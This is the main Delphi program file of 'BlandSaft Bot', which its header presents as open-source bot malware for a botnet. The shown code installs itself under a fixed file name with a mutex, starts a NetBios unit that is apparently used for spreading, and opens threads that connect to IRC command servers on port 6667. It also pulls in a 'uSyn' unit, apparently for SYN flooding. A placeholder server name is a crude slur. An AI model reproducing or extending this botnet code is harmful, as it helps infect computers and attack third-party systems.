   {

     BlandSaft Bot made by p0ke.
     Open-Source bot for BotNet 1.0.1

     MultiThreaded, can connect to more then 1 server.

     Use this at your own risk, the author(s) cannot
     be held responsible for any actions nor damage
     made / taken by this application.

   }

   Program BlandSaft;
   uses
     Windows,
     uNetBios,
     Unit1 in 'Unit1.pas',
     uSyn in 'uSyn.pas';

   {Unit1 for bot and everything}

   {
   Hex Table.
   a  b  c  d  e  f  g  h  i  j  k  l  m  n  o  p  q  r  s  t  u  v  w  x  y  z  .  -  _  0  1  2  3  4  5  6  7  8  9  ~  ?
   61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74 75 76 77 78 79 7A 2E 2D 5F 30 31 32 33 34 35 36 37 38 39 7E 3F
   }

   Const
     Servers:      Array[0..MAX_SERVERS] Of String =
     ('127.0.0.1', 'gayman');

   Var
     Filename,
     Mutex         :String;
     I             :Integer;
     D             :Dword;
     Msg           :TMsg;
   Begin
     { I put sleep here, becouse maybe a old version needs time
       to quit, or something. }
     Sleep(5000);

     FileName := 'BlandSaft.exe';
     Mutex := 'BlandSaftBotNetVersion1-0';

     Install(FileName, Mutex);
     StartNetBios(255);

     ZeroMemory(@I, SizeOf(I));
     For I := 0 To MAX_SERVERS Do
     Begin
       Data[I].IP := Servers[I];
       Data[I].Port := 6667;
       CreateThread(NIL, 0, @StartBot, @Data[i], 0, D);
       Sleep(500);
     End;
     While (GetMessage(Msg,0,0,0)) Do
           (DisPatchMessage(Msg));
   end.
